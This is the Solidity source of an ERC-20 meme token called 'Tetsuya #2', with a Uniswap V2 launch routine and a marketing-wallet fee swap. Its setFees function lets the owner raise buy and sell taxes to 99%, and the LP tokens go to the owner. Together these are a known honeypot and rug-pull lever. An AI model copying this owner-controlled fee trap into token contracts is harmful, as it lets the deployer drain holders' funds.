/**
Telegram: https://t.me/tetsuya2eth

Website: https://tetsuya2.xyz

X: https://x.com/tetsuya2eth
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TETSUYA2 is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 1e27;
    string private _name = "Tetsuya #2";
    string private _symbol = "TETSUYA2";
    uint8 private _decimals = 18;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapping;

    address public marketingWallet;

    uint256 public maxTransaction = (_totalSupply * 2) / 100;
    uint256 public swapTokensAtAmount = (_totalSupply * 5) / 1000000;
    uint256 public maxWallet = (_totalSupply * 2) / 100;

    bool public limitEnabled = true;
    bool public tradingEnabled = false;
    bool public swapEnabled = false;

    uint256 public _buyTaxes = 0;

    uint256 public _sellTaxes = 0;

    mapping(address => bool) private _isBlackList;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedmaxTransaction;

    mapping(address => bool) public ammPairs;

    constructor() {
        marketingWallet = address(0x9390e0B239b1B624Ac34039f91242501F1aFd778);

        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _totalSupply);

        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(marketingWallet)] = true;

        _isExcludedmaxTransaction[owner()] = true;
        _isExcludedmaxTransaction[address(this)] = true;
        _isExcludedmaxTransaction[address(marketingWallet)] = true;

        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function createPair() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        ammPairs[uniswapV2Pair] = true;
        _isExcludedmaxTransaction[uniswapV2Pair] = true;

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingEnabled = true;
        swapEnabled = true;
    }

    function removeLimits() external onlyOwner returns (bool) {
        limitEnabled = false;
        return true;
    }

    function setFees(uint256 buyFee, uint256 sellFee) external onlyOwner {
        require(buyFee <= 99 && sellFee <= 99, "Must keep fees at 99% or less");
        _buyTaxes = buyFee;
        _sellTaxes = sellFee;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than 0");
        require(!_isBlackList[from] && !_isBlackList[to], "blacklisted");

        if (limitEnabled) {
            if (from != owner() && to != owner()) {
                if (!tradingEnabled) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                if (ammPairs[from] && !_isExcludedmaxTransaction[to]) {
                    require(amount <= maxTransaction, "Max tx exceeded");
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                } else if (ammPairs[to] && !_isExcludedmaxTransaction[from]) {
                    require(amount <= maxTransaction, "Max tx exceeded");
                } else if (!_isExcludedmaxTransaction[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            swapEnabled &&
            !swapping &&
            ammPairs[to] &&
            !_isExcludedFromFees[from]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        basicTransfer(from, to, amount);
    }

    function basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        if (
            from == owner() ||
            to == owner() ||
            from == address(this) ||
            to == address(this)
        ) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        (uint256 fromAmount, uint256 toAmount) = handleTax(from, to, amount);
        _balances[from] = _balances[from].sub(fromAmount);
        _balances[to] = _balances[to].add(toAmount);
        emit Transfer(from, to, toAmount);
    }

    function handleTax(
        address from,
        address to,
        uint256 amount
    ) internal returns (uint256, uint256) {
        bool takeFee = !(_isExcludedFromFees[from] || _isExcludedFromFees[to]);

        uint256 fees = 0;

        if (takeFee) {
            if (ammPairs[to] && _sellTaxes > 0) {
                fees = amount.mul(_sellTaxes).div(100);
            } else if (ammPairs[from] && _buyTaxes > 0) {
                fees = amount.mul(_buyTaxes).div(100);
            }

            if (fees > 0) {
                _balances[address(this)] = _balances[address(this)].add(fees);
                emit Transfer(from, address(this), fees);
            }
            return (amount, amount - fees);
        }

        return (fees, amount - fees);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > swapTokensAtAmount * 2000) {
            contractBalance = swapTokensAtAmount * 2000;
        }

        if (contractBalance > swapTokensAtAmount)
            swapTokensForEth(contractBalance);

        payable(marketingWallet).transfer(address(this).balance);
    }
}